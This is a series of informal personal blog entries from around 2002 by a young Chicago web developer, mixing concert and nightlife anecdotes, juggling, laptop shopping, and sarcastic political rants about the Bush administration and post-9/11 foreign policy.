<p>as per the usual&#8230; the blue line took forever. so I have to piss the entire way. I am talking really bad. I can barely hold it. I get off the train and rachel is making fun of me for walking funny and having to pee so bad. and I was totally ready to piss in an ally.. no joking.. a need had come over my body. nothing mattered any more.. just urine.<br /> So we get into the ally.. and I pony up to a dumpster and let er rip. I am talking a fierce piss. like somthing out of a nature film. it was crazy. and rachel is laughing and pointing and usual. and no sooner had the initial hysteria of being able to piss worn off.. then a cop rounds the ally and heads straight for us&#8230; like all good friends rachel bolts.. heh. and I however stay put. there was no way I was gunna stop peeing becuase of some cop.. and I don&#8217;t think it would have been physically possible. it was a flood gate of sorts. no going back.. <br />so the cop pulls up and doesn&#8217;t say a thing. just sits there all non-chalant. he pulls up to align himself with me. and I say &#8220;sorry officer.. it was an emergency&#8230; &#8221; realize that the entire time.. I am pissing.. a lot.. not just a small stream. like a cannon and the cop.. just leaves.. I continue to piss.. and then we go on our way.. <br />oh.. and after they talked to me.. they asked rachel why she ditched me.. and she was like &#8220;well he is goign to the bathroom&#8221; and they left her alone.. but the black dude that was iwalking in front of us. they got out and talked to him..<br /><br />what a night..</p>

<p>so I was listening to NPR the last night during dinner.. and they mentioned how some people were critical of the Bush administrations label of <a href='http://www.cnn.com/2002/US/06/12/dirty.bomb.suspect/index.html'>Jose Padilla</a> as a combatant. what is interesting, is that it appears that the suspect may not have be all he could have been.. and now the bush administration is struggling. After September 11th and allowing the country to fall into &#8220;war&#8221; I think the bush administration. is trying to show its ability in terms of security. whatever. <br /><br /><a href='http://news.independent.co.uk/world/americas/story.jsp?story=304437'>apparently</a> the US&#8217;s accusal and subsequent arrest of Jose Padilla has pissed off numerous other &#8220;friendly&#8221; nations. Why is it that our government is digging a hole for it self. Check out the <a href='http://rense.com/general25/finalde.htm'>video</a> of bush reading to kids on sept. 11th. I love how our fearless leader is <a href='http://www.cnn.com/2002/ALLPOLITICS/06/12/bush.terror/index.html'>completely and utterly scared</a><br /><br />on a lighter note.. check these sites out:<br /><a href='http://www.prahlad.org/pub/bearden/scalar_wars.htm'>Scaler wars</a><br /><a href='http://www.thisistherealtruth.net/'>the real truth</a><br /><a href='http://xfacts.com/x.htm'>the return of planet x</a><br /><a href='http://www.hollowplanets.com/'>hollow planets!!</a><br /><a href='http://www.soulinvitation.com/enki/'>??</a><br /><a href='http://zapatopi.net/afdb.html'>my favorite hat</a> - btw, this is one of the funniest site si have seen in some time</p>

                <b>This is a rant:</b>
<p>I do not like that we are at war right now. I think it is really ridiculous. I mean, our enemy is a group of militants that we don?t officially know exists, they use weapons that are more powerful than what we use, they are scare mongered into <a href='http://i.cnn.net/cnn/2002/LAW/06/10/enemy.combatant/al.muhajir.jpg'>inhuman</a> monsters. And it seems that <a href='http://www.gwbush.com'>bush</a> has yet to <a href='http://www.cnn.com/2002/WORLD/meast/06/10/mideast/index.html'>acknowledge</a> that there is a problem in the middle east(in terms of U.S. foreign policy). We create a problem with imperialism.. Which in turn fuels another larger problem.. a religious problem with its basis in morality and ethics.. a problem mortals cannot solve. . and we choose to fight this problem by continueing our support for hate and imperialism.. thus stratifying the nations involved from a ?first world.? It is disgusting how us ?westerners? act as though we are holders of the truth. Has this ever worked?<br /><br /></p>

<p>This rules: &#8221;<a href='http://www.cnn.com/2002/LAW/06/10/enemy.combatant/index.html'>As a U.S. citizen, Al Muhajir usually would be afforded traditional legal rights such as presumption of innocence until a conviction</a>.&#8221; <br /><br />I think that it is good to take a person?s rights away? I mean what good is a citizens rights.. Especially when they are actual United States citizens. We shouldn?t treat them as such; we should treat them <a href='http://www.aclu.org/safeandfree/index.html'>as if they are prisoners</a> from a country we are at war with. Even if there is no country or no war. They are obviously committing treason and shouldn?t be given any rights whatsoever. <br /><a href='http://aclu.org/issues/security/hmns.html'>Rights are dumb anyway</a><br /><br /> <b>I could be wrong</b></p>

                <p>So I have been reading a lot of african literature. it is so nice. I really needed somethign that would make me smile again. all my books had gotten stale. so it was a nice change.. <br /><br />This weekend was strangely lonely. I just sat around. even when I was out.. it wasn&#8217;t exactly thrilling. I did get my project done. which was cool.. and received good word from its recepients. but.. for some reason. there was a strange dark cloud hanging over the whole weekend. maybe it was my frustrations coming to the surface.. hah. whatever. <br />today I broke my headphones. I am sad. they were such nice headphones. luckily for me. I know how to solder and all that nonesense. It is my fathers birthday today. I hope he has a good birthday. happy birthday dad. I think I once made him a webpage b-day card.. using dynamic html and such. it was fun. heh. <br />i got some interesting links. first off.. <a href='http://homepages.msn.com/SpiritSt/s8int/phileatomic.html'>here</a> is evidence that nuclear war occured in ancient times. whoa. second.. a <a href='http://www.hermes-press.com/nonews.htm'>page</a> describing why you are not getting any news. its true. think about it. when was the last news item you received. for me it was the election scandle in florida. after that.. there was all dribble and sound bites. nothing of consequence. even 911 was veiled in secrecy. wtf. the last link is a description of the <a href='http://www.accessatlanta.com/ajc/opinion/1201/1920bomb/1216bombing.html'>first wtc bombing</a>.. wierd.</p>

                <p>The Toys-R-Us on state is going out of business so my coworkers and myself are going out of business and all the toys are uber cheap. I picked up a <a href='http://www.techtv.com/freshgear/products/story/0,23008,2464987,00.html'>HitClips</a> playerand some britney hitclips. I am excited. It is rather shoddy and it did cost more then it should have(especially considering the brief amusement it caused). I am interested in <a href='http://wearables.blu.org/wear-hard-01/20015689.html'>hacking</a> the little guy.. I would be interested in hooking it up to something else. like headphones for instance. however.. I do not think it is stereo able. I did take it apart and it seems that the cradle part is just power and amp. no decoding or anything like that. The hitclips themselves are responsible for producing the music and sound. THe are just a couple resisters and a sealed section. the radio clip is a lot more complicated and actually kind of handy. it would be really easy to make a larger player for these little clips. but why woudl you do taht. hmm..</p>

                <p>So this weekend was quite somthing. Friday night I went out with friends to a coupl eclubs. and hung out with &#8220;rockstars.&#8221; it was fun. They are all very nice. And strangly.. a high number of them are apparently computer people. it is wierd. I ended up staying out til 5 that night which was a shock to myself. I didn&#8217;t mean to at all. heh&#8230; whoops<br /><br />so after a late start.. my friend kayne and I headed out to indianapolis for the indy 500. he has a miata.. which is a freakin small car.. but it rides really well.. it was &#8220;sporty.&#8221; We showed up around 4:00 and met my father and his friends. They are funny people. My father had brought my families scooters.. so kayne and myself spent a lot of the day yesterday helling about indianapolis on the scooters. they are really fun. I suddenly understand the scooter pnks and the fun they always seem to be having. it was so cool&#8230; so anyway.. the race today was crazy. we had really good seats. and a coup<span>le crazy &#8220;incidents&#8221; occured right in front of our seats. it was insane. those cars go very vyer fast. It sucked because the winner totally &#8220;tricked&#8221; himself into a win. it was kinda sketchy. so so fast..</span></p>

We went to star wars.. which relaly sucked. but ok whatever. yoda rules. we hung out a lot. ate a lot and drank some. got into figths at punk rock shows.. hehe. just kidding. we just hang out. but in such a way that is only possible in chicago. so I guess it was successful. I wish I could hang out with girls again. haha</p>

                <p>Today I made a dtd. This isn&#8217;t really exciting so to speak. But it is quite fun for me. In my head anyway. I really enjoy stupid shit like that. It cracks me up. Last night the phone rang like 5 minutes after I went to sleep.. at like 1:45 or so&#8230; and I when I got up to answer the phone I glanced over and noticed a glowing ball of spirits next to my bed. they slowly dissipated.. mostly because I was talking delieriously on the phone. It was quite interesting. I laughted a bunch. I don&#8217;t know if the humor transcended my dreary state however. <br /><br />Today I was invited to help with projects for a new mindstorms book. heh. How fun. I hope I win. haha. <br /><br /> <a href=' http://www.boardsmag.com/screeningroom/musicvideos/220/'>this</a> is neat. <a href='http://www.explodingdog.com'>Exploding Dog</a> is better.</p>

                <p>Some activists have papered the city of chicago. It is great. My boss came into one of our offices and pointed out the thousands and thousands of little papers that said &#8220;George W. Wants War!&#8221; Someone obviously dropped them by aeroplane or by building top. This is a great way to get people to notice. I only hope that it is covered by the papers. I hope that the people get arrested and a big stick is caused. because then people might suddenly notice what the papers actually had on them. the message is very important. George Bush does want war. and I am afraid that it is our generation that will pay for his sins. <br /><br />in other news, I finally found some really good <a href='http://www.microsoft.com/windowsxp/pro/downloads/powertoys.asp'>XP powertoys</a>. They have pagers and all sorts of goodies. <br />A <a href='http://www.cnn.com/2002/US/05/12/lion.attack.ap/index.html
'>lion bit the arm off</a> one of its handlers. I think this is quite funny. the whole arm. man. Although I do not think it is funny that the young women lost an arm.. I do think that the animal is in fact a lion and is kinda large and predatorial. <br /> Dumb ass bush is trying to <a href='http://www.cnn.com/2002/ALLPOLITICS/05/13/white.house.cuba/index.html'>strengthen up</a> the U.S&#8217;s relationship to the horrible communistic state of cuba. whoah. better watch out. Cuba may be on the prowl. I guess the size of the organization does not matter it is the ideas that they hold. We should totally get in a world war. <br /> Ahh the love of court ordered attornys. I think that <a href='http://www.cnn.com/2002/US/05/12/inv.moussaoui.fbi/index.html'>this guy is insane</a>. Well obviously. But his terroristic act hasn&#8217;t ended. People do not get that the terrorists were successful. They really were. They cause fear and change within our country. If we wouldn&#8217;t have let it bother us so much - then it wouldn&#8217;t have worked. But we demonstrated how much they have won by going to war, by changing our laws, by trying to protect something which is a theory and an ideal. We cannot protect freedom by limiting our own freedom. Our country has paved the path for terrorists to alway walk over us. The terrorists have already won, and we let them.</p>

                <p>Tonight my friend and myself went and saw belle and sebastion at the congress. It was incredible. They really rocked the house something fierce. They played a lot of great songs. and they ended with a rendition of Thin Lizzies &#8220;The Boys Are Back In Town.&#8221; The concert was so fun. Insanity. I didn&#8217;t want it to end eva. heh. <br /><br /> I just found out that my site, audreyhacking.com was one of around 16 honorary mentions out of around 460. I didn&#8217;t know. I mean I didn&#8217;t win the big prize. but still, 16 out of 460 is pretty good. Yep I rule. haha. I wish that is what that meant. Hmm. I wonder what this will mean for my illustrious future?<br /><br /> I am however one of the biggest nerds and I have such a crush.. but whatever. its fun and quite enjoyable.</p>

                <p>I saw <a href='http://www.imotorhead.com/index2.htm'>motorhead</a> last night. It was so so loud and my head wanted to die. Morbid angel and Today is the Day also played. Morbid angel is one of those bands that creates a sound that shouldn&#8217;t be coming from humans. It is so rough. The drummer is insane. They all had the requisite metal hair, however they used big fans to blow it past their faces and heads. it looked so cool. For morbid angel I was really close to the mosh pit, which is something I have not done in awhile.. I usually run from that sort of thing. I must have felt especailly tough last night. ;) <br /><br />check out <a href='http://zippotricks.com/flesh_torch1/flesh_torch1.html'>this</a>.. be sure and watch the videos in order.

                <p>Last night at juggling club. I got into an argument with a strange suburban man who had good ideas, but was really stuck on how capitalism is evil. I am unable to work in that paradigm. I cannot think that capitalism is the evil. I think the how capitalism is executed can be bad, exploitive and destructive.. but that is not the failt of capiitalism. It is the fault of the executor. me thinks&#8230;<br /><br />I just started watching myself type. and I have a very strange typing pattern. The terratories which my hands occupy is not normal. My right hand is a little bit imperialistic and conquers my left hand often. Its trouble.</p>

                <p>Tonight was fantastic. I don&#8217;t know if I have used fantastic to describe a night in awhile. I went and got some new clothes, matiss and I went to the Art Institute&#8217;s graduate art show(It is real real good and huge) and then we hung out with a cool new friend and we went to see spider man. I really enjoyed both. <br /><br /> The movie was quite something. It was incredibly funny and sam raimi has proven himself to be the master of kitsch. heh. howeve I am sad. I didnt even recognize bruce in his cameo. alas&#8230; maybe in the next viewing..</p>

                <p>I have a strange hobby where I look at people peronal home pages. I really enjoy reading peoples blogs and learning all sorts of interesting things about them. heh. it is a strange voyeuristic hobby I guess, however it passes the time. I used to look primarily at slashdot comments. But lately I have been playing on <a href='http://www.makeoutclub.com'>moc</a>, I recently <a href='http://www.makeoutclub.com/03/search_results.phtml?gender=either&amp;searchfield=location&amp;searchterm=greeley&amp;reverse=#'>searched for people</a> in my home town of <a href='http://www.greeleycvb.com/aboutgreeleyf.html'>greeley</a> and I found an interesting phenomona: if you search <a href='http://www.makeoutclub.com/03/search_results.phtml?gender=girls&amp;searchfield=location&amp;searchterm=chicago&amp;page=2&amp;reverse=#'>chicago</a> you don&#8217;t come across many women that are really big into the web cam/subtle porn culture, whereas if you do the same search for <a href='http://www.makeoutclub.com/03/search_results.phtml?gender=girls&amp;searchfield=location&amp;searchterm=greeley&amp;reverse=#'>greeley</a> 2/3 of the people are webcam girls. It is crazy. Check out <a href='http://5ilver.net'>Mindy's page</a> and then <a href='http://caerrie.com/'>Caerrie's page</a>. See what I mean. Wierd.. heh. someday I will be a web cam girl. and have good designskills and all that. In the meantime I will play <a href='http://www.gamespyarcade.com/software/webgames/sicktwisted//fivefinger/fivefinger_index.htm'>this</a> game to pass the time. <br />I somehow hurt my finger. I went and juggled a bunch this weekend and then when I woke up tuesday morning, my finger was swollen for no apparent reason. I refuse to awknowledge that juggling may have somewhat of a relationship to the swoll in my hand.</p>

The scene was silly, however Art and science did hair and I love them. haha. Then on saturday and sunday We went to the <a href='http://www.tossup.com'>toss up</a> juggling festival. It was great as well. We came in second in numerous competitions, including 7 club endurence, 10 club feed endurence, and others. anyway. I am way boring right now. I have nothign to say and nothing to report. I will have some fashion show pix soon.<br /><br />check <a href='http://home.attbi.com/~digitalpunk/1/bring.gif'>this</a> out.</p>

But the repository also has a lot of <a href='http://www.skinnymike.com/chicks/hardcore.jpg'>personal</a> pictures as well.

                <p>So Microsoft wants to control the national ID initiative with its .NET passport system.

                <p>Technologists are so crazy. they never seem to stop trying to figure out what is going on. <a href='http://sybodek.com/dsc/'>this</a> is a great link exemplifing this very idea. The DSS scene is stuck because of DTV&#8217;s good ability to counteract good hacks to their smart card system. They keep upgrading and fuxoring everyone up. But the hackers keep coming out with new fixes.. and tey keep making sites that teach kids how to participate. It is great.</p>

I may also sit in my room.. drink soda and eat food.. which is amazingly appealing. oh.. and write web applications of course. I juts went to a rock show.. which was fun. and met cool people.. except all of the girls are very young. why is this. I want to meet interesting people that are my own age and attractive.. argh.. heh</p>

                <p>damn violent concerts.. crazy excessive people who are insane. it was madness - at least dimmu borgir was good and calm.. this was incredulous&#8230; ;) huh<br /> <br /> i wanted to come home and listen to something without bass. it was tough. I am probably going to order my laptop soon. I really don&#8217;t know which to get. It is so tough. I don&#8217;t want to drop 2k on a freaking laptop.. but I don&#8217;t want a piece of crap either. alas.. the ol ibook vs. dell quandry. nobody will ever know which is better. on one hand the ibook is lite(4.5lbs) and lasts 5 hours. whereas the dell is a little heavier(5.5lbs) and last 3.5 hours per battery(2 possible).. well I think the kicker is the OS. obvious OS X sucks.. haahahahahha. I wish that was true it would make this stupid decision so much easier. I guess it boils down to the fact that I am super attracted to OS X but I know that I need PC hardware.. no matter how much my friend <a href='http://www.127th.com'>bryan</a> thinks otherwise.. I really need that intel chip.. so I guess the dell wins.. and linux also wins.. and so does vmware and XP.. haha.. and the ipod.. wait a sec.. the ipod.. what the..</p>

Whee. I hope I win. That would rule. In other news. I slept a lot last night. it was nice. however.. I slept so much that I overslept this morning. argh.<br /><br />I think that I am going to purchase an ibook on friday. I hope anyway. that would really excite me. I want to see my friends to make sure that I want one. it just seems so cool. heh. I don&#8217;t know about the whole mac deal. but whatever. I will really miss two mouse buttons.. hah. but I suppose I can deal with it. <br /><br />i think I am going to make this weblog start embedding links automagically. so when I would type ibook it would look up ibook in a DB and automatically associate ibook with the apple ibook site. hmm.. maybe too much work.. especially when I have other thigns to do that are a lot cooler and get me money. haha. <br />check out <a href='http://dylanreed.org/archives/00000011.htm'>this</a> crazy entry&#8230;</p>

I saw them a long time ago..&#8221; - &#8220;oh, maiden.. I have their dvd..&#8221; <br /> I am no better.. but at least I act like myself.. rather then what I feel someone to act.. I also scored a &#8220;date.&#8221; well not really a date.. only a date because all days have them.. for a concert.. on thrusday.. she is really cool.. and she digs cannibal corpse.. ha.</p>

                <p>I just finished watching ghost world. I am not sure if my time has been wasted or not. I don&#8217;t think so. But you never know. heh. this weekend was quite good. I had a lot of friends over and went out to a lot of clubs. I also spent far too much money for the amount of return I got. But that is OK. It was really funa dn I was able to lose all of my worries for one weekend. It was really great to see kinnera for awhile. I really miss hanging out with her. Sometimes my dreams are contrary to reality. but alas.. <br /> last night we went out around 10:30 to a club called rednofive for some dj tha didn&#8217;t even show up. something to do with immigration.. then we went to liars club. which was mediocre as always.. and then to crobar. hah. what a trip that was. it was quite a night. 10:30 till 5. hah. hehe. slept all today. I suppose I should not fsck my sleep partners up any more then they are already. but whatever. <br />i am getting excited about timelapse.com. <br />i really want to date people.. but its hard. the city is sometimes so lonely. it is funny how pathetic that is. but its true. maybe I should get my guts up to ask someone out or something. that would be a start.</p>

                <p>this morning whilst I was in the shower, I got to thinking about how anoying our media and its relationship with the government is. In one particular example: the whole enron thing. It seems that when clinton ran into some women problems, he was crucified - however when bush, cheney and the like get involved in a <a href='http://michaelmoore.com/2002_0129.html'>complicated financial scam</a> the media as well as our elected leaders turn their collective eye. Why do you think this is? Is it because too many people are involved and linked to the Enron crash. Is it because th eEnron crash and its link to the privativation of everything may have caused the argentina crash. Is it because they passed lots of legislation for enron and it would look poorly to come out and sya that the biggest lobby group was funded by criminals. oh right.. hehe.</p>

<p>I really think that bush wants to be known as the man who broke the world.</p>

                <p>tonight.. I did and possibly finished my taxes. it is incredible. I thought this day would never come. It wasn&#8217;t very hard. especailly with lovely turbotax helping me along the way ;). That is very funny to me. All I had to do was answer questionsa nd hope it came out right. I hope that I did it correctly. <br /><br />I hated tonights academy awards. I thought that beautiful mind should not have been awarded all of the awards.. especially since it left outsome rather important facts about the math guys life(nash). I was sad. <br />I went out the otehr night to a fashion club. It was fun. A lot of beautiful people. hehe. a lot of silly looking people too. I hop ei was in the first group.. but probably not. alas..</p>

                <p>i title many blgs tonight. I don&#8217;t know what the deal is. So I am now twenty four. I had an ok birthday. It was nothing special - however I went and hung out at my favorite bar. Which is sorta fun. actually quite a bit of fun. matiss and I chilled there for awhile and watched crazy japanese snuff,rape,horror movies. not real good but an interesting view none the less. <br />I also went and saw le tigre tonight. they are quite something. I really enjoyed them. I have them in my head as I write this. but the magic of the night was tracy and the plastics. they ruled. quite fun. tonight I am supposed to goto the plaid show. I hope it is cool.. and tomarrow I am supposed to go OUT OUT OUT. wheee. maybe I will get lucky.. just kidding.. hehe..</p>

<p>In the past couple days I have noticed quite the mess of our foriegn policy. Maybe it was seeing president bush upclose and personal.. or maybe it was seeing the article that said that warrented nuke use would be in a confliect with china over taiwan and foreign policy. and then I see some articles showing how the U.S. is pissing china off beacuse we are not treating taiwan as a part of china, but as its own entity.

                <p>I love going to the internet and seeing a fresh brew of fear waiting for me on the other side. It is quite disconcerting. Check out <a href='http://www.latimes.com/news/opinion/la-op-arkinmar10.story'>this</a> and <a href='http://www.nytimes.com/2002/03/10/international/10NUKE.html'>this</a>. as well as <a href='http://news.bbc.co.uk/hi/english/world/americas/newsid_1864000/1864173.stm'>this</a> and <a href='http://slashdot.org/article.pl?sid=02/03/10/0153216&mode=nested&tid=103&threshold=3'>this</a>. <br /><br /></p>

<p>It seems inconceivable to me, that are happy little world is sent back into the cold war. But this time the opposition is much more aggressive and is fighting a moral battle that isn&#8217;t simply won by having patience and being the &#8220;better nation&#8221;. This time the winner will seemingly be the nation who can push their opinions, morality and culture on the other by any means necessary. <br /></p>

<p>So in our case&#8230; it seems that extreme violence will be needed to take care of the problem of disagreement and opposition throughout the world. Which I agree is not a bad plan. however, I am worried about the retaliation to our first strike, or our isolationist foreign policy. I imagine that tat some point a nuclear strike will suddenly seem like a good idea. <br /></p>

<p>How can we survive as a country and as a world when are elected leaders are going to run us into the ground. I remember in high school, a teacher I had spent quite a bit of time explaining fanatical isolationism and nationalism as one of the horrible lessons that history has taught us. We don&#8217;t need that here. We have a hard enough time dealing with the fact that our(the U.S.) leaders haven&#8217;t a clue about the global climate. They are not listening to our allies&#8230; let alone our enemies. Instead we tighten up our borders and cause global unrest and create an environment where our first power status will be challenged by every other country within reach. <br /></p>

<p>&#8221;<i>The terrorists who struck us on Sept. 11th were clearly not deterred by doing so from the massive U.S. nuclear arsenal," Rumsfeld told an audience at the National Defense University in late January.</i>&#8221; Obviously.. However it seems that rather then re-architect our foreign policy to be more open to the global climate.. We are more interested in modifying an already ill-proven plan of striking fear in the hearts of our enemies. wtf. Our enemies are obviously scared enough of us to use any possible force to attack us. I just fear that the U.S. will be the horrible joke of a history class in many years. We will talk about are great president and how his staff pushed for a severely limiting and cursed foreign policy that caused a small terrorist attack (the largest in the relatively small history of the country) to be carried out, and how that led to a war against the said terrorists and that led to a war against the said terror supporters and that led to a war with the said terror supporters supporters&#8230; and we now have to live underground. <br /><br /> sounds fun. <br />I sit here and listen to the sounds of Melanesian chants. They are very beautiful.</p>

I like it when people save you from an impending doom you can feel. like eating beef stew. heh. even though it is sorta good. arrghh.. not real good. <br /><br />anyway. the night turned out to be very good. I was pleasently surprised with the results. it will be nice to see what transpires. ;)</p>

                <p>This weekend was good, my friend from high school, megan, came and visited. It was fun to be around her again.. ever since friday my life has been very very surreal. After I got home from work - I immediately got a huge headache. HUGE. it was horrible. I stumbled around and then a firned picked me up. I passed out in her car and awoke to find myself in a nice indian resturant. ahh.. how nice. I ate a lot and then found myself back at my apartment. ahh.. <br /><br />Then I went to a film fest. with a new friend of mine. it is amazing what can happen in a week. heh. I love meeting cool people and learning about them. especially when connections are made. I have been in chicago for 8 months now and I have barely met 15 people that I can name. so when I meet someone and they really impact me it is a nice surprise. <br /><br />i am so excited for tonight. There is a death metal show. eeek. Dimmu Borgir. hehe. arrrgh. I am thrilled to see them. I have listened to them for a while now. heh. the only problem is that I only know one song of theres. heh. So it should be fun.<br /><br />i wish I was able to make noises on this web page. I would output a bunch of tones that are similar to the song the elders sing in dark crystal. then I would type out in big letters: I LOOK TOWARDS THE FUTURE&#8230; if I only knew/had flash.. heh.</p>

                <p>I remember when a friend of mine used to allude to my relationships as weather. He would ask how the weather was. I would always respond with some equally vague answer. It was fun. Today I went to watch breakdancing. It would have been fun, if it hadn&#8217;t been canceled. suxors. However. rigth before break dancing I talked to a new friend on the phone for quite awhile. It was nice. It is fun to meet neew people. I hope we hang out a lot. hehe. crush crush.<br /><br />I really wish that the news wasnt so biased. Why does the media trick us so. It frustratedd me so much. I can&#8217;t even deal with it. Today Matiss gave me a comic. Now my life is ruined. heh. another hobby is not what I need. Well anyway. I sometimes wonder if a weblog is detrimental to a persons notion of privacy.</p>

                <p>I really need a new computer. I would really like a laptop.. with a UXGA screen. For the last 1.5 weeks I have been using my cell phone as an instant messenger client. It is kinda cumbersome and not exactly convienient. however. it works. ugh<br /><br /> So a friend came over tonight.. she is nice. I would like to get to know her better. heh. however.. all her stuff was stolen out of her car whilst she was visiting. it sucked. I was so sad. her CDs her friends CDs her cameras.. everything. what a mess. if my CDs left I would cry a bunch. I knock on a lot of wood. This weekend was fun. My plane which I was on coming back from new york was forced to take an emergency landing.. hehe. it was crazy. Harold Ramis was on the flight with me. Wierd. I used a urinal next to him for a small amount of time. I wanted to scream &#8220;don&#8217;t cross the streams!!!&#8221; - however I didn&#8217;t.<br /><br />I met a bunch of new people this weekend. how nice.. . <br /><br /> <small>I need a new computer. I need a new computer. I need a computer. I need a new computer.. alas.. it is so depressing..</small></p>

                <p>I forgot to mention in my last post that I went and saw the show producers. What a funny show it is. Boy howdy. heh. I hadn&#8217;t heard anything about it so I was quite surprised. Matthew Broderick was very good as was the understudy for nathan lane(alas he couldn&#8217;t make it). It was quite funny. some of the jokes caught me quite off guard. heh. <br />being in new york, and seeing a lot of hasidic jews.. my hair style suddenly has lost its appeal. I feel as though I am some sort of traitor or that I am mocking a culture. I really don&#8217;t like it. good thing I am leaving :).<br /><br /> it is really wierd to be at this conference. Quite a few of the people who you would expect to be at this conference are not hear. quite a few have gone out of business. it is crazy. the internet world is nuts. really wack. Why is it ending. maybe REM was right&#8230;<br /><br />so tomarrow I am going to see &#8220;ground zero.&#8221; it is crazy&#8230;</p>

                <p>This weekend was a great time. I modeled in another fashion show. I don&#8217;t know if I have any pictures as yet. I hope so. I met some rather cool cats, some I hope to see again. heh. I also went to some crazy frat boy bar and had free drinks and then found the crazy new meaning to &#8220;hungry drunk.&#8221; I also fixed my direct TV. heh. however, it is still sorta wack. but whatever. I still thikn that we are going to have WWIII soon. I am going to new york in two days. The idea of business trips wierd me out somethign fierce. I hate how credit companies check your credit to send you those &#8220;you have been pre-approved&#8221; junk mails. and then when I need to get credit they say. nope too many inquiries.. wtf. how annoying. whatever. may the force be with you. I watched requiem for a dream again this weekend. it was fun. such a good movie, I often use stuff like that as a way to benchmark people I just met. it seems to work, for one of the people I just met is rather cool and seems to really like that movie. heh. I am ranting like a coke addict. I suppose I should just goto bed. hah</p>

                <p>Last night I went out to a seedy bar with some friends after work. Drank a little - helped another friend with web problems. and then went to some movies. I say some because we couldn&#8217;t afford to goto the movie we wanted to goto. So we purchased tickets to a cheaper movie and then after an hour of the <a href='http://us.imdb.com/Title?0273923'>cheaper movie</a>, we sneaked out and the <a href='http://us.imdb.com/Title?0192657'>movie</a> we came to see was just starting.<br /><br /> <a href='http://us.imdb.com/Title?0192657'>Shiri</a> is arguably one of the best movies I have ever seen. It was not at all what I expected. It was horribly sad, very violent and somewhat humorous. The <a href='http://us.imdb.com/Name?Han,+Suk-kyu'>cast</a> was incredible. They all did very very well. It wasn&#8217;t a good valentines movie, and it really was <a href='http://us.imdb.com/CommentsShow?192657-1'>quite sad</a>. However, iit was seriously one of the better movies I have ever seen.</p>

The funniest shit happened while I was there: they thanked all the veterns for fighting for freedom so we could &#8220;sit here and smoke, drink eat and gamble.&#8221; WTF. that is exactly what they are fighting to maintain. it ruled.

                <p>Today, I was almost hit by a car. I mean real close. It wasn&#8217;t my fault either. I was just walking in the cross walk and this taxi tried to hit me. I didn&#8217;t flinch at all.

I am so happy and thankful that we are still friends and that we are still very close. It was an incredible 14 months. and I don&#8217;t plan to let it end at that :).</p>

                <p>Today, as I was walking to work. I glanced over and noticed that castro was standing impatiently next to me. He qwas jonesin to cross the street. He was wearing a workers uniform. Always the joker I guess :). As he skipped across the street.. I couldn&#8217;t help but think of the bay of pigs.. if only kennedy could see him now.. or kruschev for that matter.<br /><br />Soon I get my DSS stuff.. more experimenting for me. and I also get a really cool keychain. That shuold happen today. wheee&#8230;</p>

I guess I could convert it to delphi and release a windows binary. heh. If you want, you can download the <a href='http://nata2.info/geek/Misc/CRI0021.ZIP'>original BBS door</a>, but you will need a <a href='http://nata2.info/geek/Misc/sbbs.zip'>bbs</a> to run it from.

                <p>I am so tired today. I wish I was a simple web app designer. Soemtimes I don&#8217;t really like my job. This is the first time I have used this blog to vent about my employment. I feel bad venting. But I don&#8217;t have anywhere else to go.. ;). <br />I am frustrated at what I see as unprogressive movement. It isn&#8217;t necessarily anything that happened today. it is just that I get frustrated when certain actions and reactions were predicted and nobody notices. I feel under-utilized and frustrated. I wish that my title was changed to something that is more appropriate to my job. My description is Intranet developer. I have never developed here. I have never done anything like that. I have only architected. But I don&#8217;t get credit for that. I don&#8217;t get respect. I don&#8217;t get anything&#8230; argh.. well in 5 minutes my views will completely change. <br /><br /> I want to try and get my CISSP certification. It seems hard. but I don&#8217;t know. I just need a reason to do stuff. and right now I have no reason..</p>

                <p>since I last updated this page. On thursday.. I found out that I would be accompanying a bunch of servers to vienna, virginia in an emergency server upgrade. So I went and rented a car, got servers from one colo facility and brought them to virginia. We drove a bundle of hours.. went through indiana, ohio, pennsylvania, maryland, virginia and Washington DC. We ended up staying right across from the target data center and so the server delivivery was insanly easy. In fact the whole installation took less than 1.5 hours. 5 B50s in 1.5 hours means I could install 80 in a 24 hour period. heh. It was insane to see these servers. they are huge. really really big and completly underutilized. Heh. ohh.. how I love RS/6000s - lies.. <br /> I got pictures.. I will post them soon. I got a good one that almost seems virtigo-ish. Quite funny. <br /> Oh, and DC was cool. we went clubbin and all sorts a fun stuff. we didn&#8217;t have much time however.. so that sucked.. it also sucked because I didn&#8217;t get to see any of my east coast friends.. alas.. I guess I will have to treck out again.. I imagine.</p>

                <p>So everyday I walk down some street that is being reconstructed. It is really neat to see civil engineering happen over time. Quite something really. I quite enjoy watching the big machinery move about and crush and build and destroy things. I often time mistake them for dinosaurs. I mean I know they are not dinosaurs.. however they could be. I imagine them being the same size as dinosaurs - and in that flintstones sorta way.. they are being used as dinosarus would be used. It is fun. <br /><br />Last night I went and saw busta rhymes. and boy oh boy did he bust da rhymes. heh. well. ice cube was in the audience and apparently &#8220;eazy-e&#8221; was there as well. Which is rather surprising cuz he is dead. or busta accidently exposed the plot that got 2pac and biggie smalls.. as well. hmm.. I wonder.<br /> <br />poor john walker&#8230; no bail for him.. I guess he shouldn&#8217;t have acted on his religious wants and needs. It is often hard for me pick a viewpoint or a side in situations like this. It seems that some of these peopl eare being &#8220;charged&#8221; with being affiliated with the taliban. I get confused though, because I was under the impression that the taliban was as much a religious sect as the Seventh Day Adventists are. So if 5000 of the 7000 seventh day adventists got together and ripped shit up - would the government try and arrest ALL of the SDA? or would they try and arrest the 5000 that broke the law. I don&#8217;t understand. I am afraid that all of this is too broad. Also.. the U.S.&#8217;s foriegn policy is setting a great precident for other countries to follow. I cannot imagine bush sitting still while china takes a bunch of &#8220;our&#8221; soldiers.. who are &#8220;illegal combatants,&#8221; and mistreats them in a similar respect with what we are doing with afghan people at camp X-ray. What will bush do in that situation.. probably attack.. and then what will we do.. probably die.. wheee.. I love our isolationist foriegn policy.. almost more than I love our enept president.</p>

